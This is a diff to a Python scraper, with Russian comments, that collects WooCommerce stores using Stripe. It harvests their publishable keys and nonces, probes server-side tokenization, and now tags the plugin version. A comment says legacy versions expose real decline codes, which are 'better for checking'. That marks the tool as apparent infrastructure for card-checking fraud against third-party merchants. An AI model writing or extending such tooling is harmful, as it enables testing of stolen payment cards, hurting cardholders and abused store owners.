@@ -106,6 +106,7 @@ class Gateway:
     cooldown_until: str = ""
     tokenization: str = ""  # "ok", "blocked", ""
     product_id: str = ""
+    stripe_version: str = ""  # "legacy", "upe", "blocks", ""
 
     def to_dict(self) -> dict:
         return {k: v for k, v in self.__dict__.items()}
@@ -240,7 +241,26 @@ async def validate_site(client: httpx.AsyncClient, url: str) -> Gateway | None:
 
         country = _country_from_html(html)
 
-        # Шаг 4: Тестируем серверную токенизацию
+        # Шаг 4: Определяем версию WC Stripe плагина
+        # legacy (< v6) пробрасывает реальные decline_codes — лучше для чекинга
+        # blocks (v8+) скрывает причину за generic "Payment processing failed"
+        stripe_version = ""
+        try:
+            checkout_resp = await client.get(f"{url}/checkout/")
+            checkout_html = checkout_resp.text
+            if "wc_stripe_params" in checkout_html or "wc-gateway-stripe" in checkout_html:
+                stripe_version = "legacy"
+            elif "wc-stripe-blocks" in checkout_html or "wc-stripe-payment-element" in checkout_html:
+                stripe_version = "blocks"
+            elif "wc-stripe-upe" in checkout_html:
+                stripe_version = "upe"  # v6-7, промежуточный
+            # Если pk нашли на checkout — сохраним
+            if not pk:
+                pk = _extract_pk_from_html(checkout_html)
+        except Exception:
+            pass
+
+        # Шаг 5: Тестируем серверную токенизацию
         tok_status = ""
         if pk:
             try:
@@ -279,7 +299,9 @@ async def validate_site(client: httpx.AsyncClient, url: str) -> Gateway | None:
                 tok_status = "error"
 
         now = datetime.now(timezone.utc).isoformat()
-        return Gateway(url=url, pk_key=pk, nonce=nonce, nonce_ts=now, country=country, status="active", tokenization=tok_status)
+        gw = Gateway(url=url, pk_key=pk, nonce=nonce, nonce_ts=now, country=country,
+                     status="active", tokenization=tok_status, stripe_version=stripe_version)
+        return gw
     except Exception:
         return None
 
@@ -335,7 +357,7 @@ async def run(max_sites: int = 100, validate_only: bool = False, serper_key: str
             existing_urls.add(gw.url)
             new_valid += 1
             tok_label = "✓TOK" if gw.tokenization == "ok" else "✗TOK" if gw.tokenization == "blocked" else "?TOK"
-            print(f"  [+] {gw.url} | pk={gw.pk_key[:25]}... | {gw.country} | {tok_label}")
+            print(f"  [+] {gw.url} | pk={gw.pk_key[:25]}... | {gw.country} | {tok_label} | stripe={gw.stripe_version or '?'}")
 
     save_pool(pool)
     print(f"\n[OK] Валидных новых: {new_valid}. Всего в пуле: {len(pool)}")
